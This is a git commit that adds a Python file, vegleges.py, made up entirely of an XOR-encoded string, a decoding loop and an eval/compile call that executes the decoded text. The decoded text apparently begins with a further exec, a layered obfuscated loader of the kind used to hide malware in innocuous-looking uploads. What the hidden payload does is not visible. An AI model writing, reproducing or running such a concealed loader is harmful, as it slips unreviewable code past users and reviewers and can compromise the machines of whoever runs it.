5d3ad3b11d0978426486d1ff347cecb98dd2e9c2
Dóczi Adrián <98951852+docziadrian@users.noreply.github.com>
2023-03-21 00:58:41 +0100

    Add files via upload

---
+++ vegleges.py
@@ -0,0 +1,12 @@
+wopvEaTEcopFEavc ="W@SW\x1fof__C[FAfj\x1d\x14C\\^S\x16\x1e\x19RTP\\]DF\\FC\x11mkX[FZAFkh\x1a\x13[WG\\\x0f\x02\x11\x10\x19W\x05\x0cQSQWST\x1clj\\XDZDBmi\x18\x17Z[SQ[E\x17\x1b\x18_UBS^Z^UPE\x18\x15AF^\x1b\x0c\x10\x19\x11\x11W}[\r`|\x04yK}qfaeR\x18\x7fCPXwq{\x16Q@qtwX\x7fSgv`CAkXp[\x00\rX[_`_LdHc\x19}\x00\x05kdvLB\x06BO\x03E\x00~]@\n\x05re[Dz\x06\\\x00g\x00Cr}\x02\x03tUSFp\x0byUnRfhL]uRF\r`~cD[\x04\x04S\x01tE]D\x02buR\x07ar_Oc\x01fWdp\x05\x01\x01rW\x1bOD\x06\x0c_\x0fY\x01g\x04\x06\\\x06z}UrEyRt_\x7fgfG^uTb\\kZEURz[DuIRZGgwx~}Q[{r~z|Wc\x7fcFGTSUBwp{b\x0eB{b\x05ZsUS\x01P{xY\r|dN{p\x1e}rGThd\x02fyXCMinr~\x0b\x1c~D\tlQ\x04}]~\rVG\x06m^LnL\x01x~uvCP\x7flFRXq{DzfJ|p}{{HvpFS\x05_tuW|T\x03SS@\x16qy\x03{\x08b\x06w\x0f]\x11\x18h\x03m\x1d\x1d\x10" 
+
+iOpvEoeaaeavocp = "2864709623445955390711776133044950924166532472496499669753856287143555456626009474860268066091157024"
+uocpEAtacovpe = len(wopvEaTEcopFEavc)
+oIoeaTEAcvpae = ""
+for fapcEaocva in range(uocpEAtacovpe):
+    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
+    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
+    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
+
+
+eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
